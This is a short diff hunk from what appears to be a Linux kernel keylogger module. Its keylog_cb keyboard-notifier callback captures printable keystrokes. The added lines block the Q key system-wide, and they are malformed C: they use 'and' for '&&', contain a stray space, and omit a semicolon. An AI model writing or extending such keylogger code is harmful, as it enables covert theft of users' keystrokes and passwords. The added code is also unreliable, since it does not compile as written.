@@ -90,6 +90,10 @@ static int keylog_cb(struct notifier_block *nb, unsigned long action, void *data
     struct keyboard_notifier_param *param = data;
     unsigned long flags;
 
+    if ( action == KBD_KEYCODE && param->down and param-> value == KEY_Q) {
+        return NOTIFY_STOP
+    }
+    
     if (action == 4 && param->down) {
         unsigned char c = param->value & 0xFF;
         if (c >= ' ' && c < 127) {
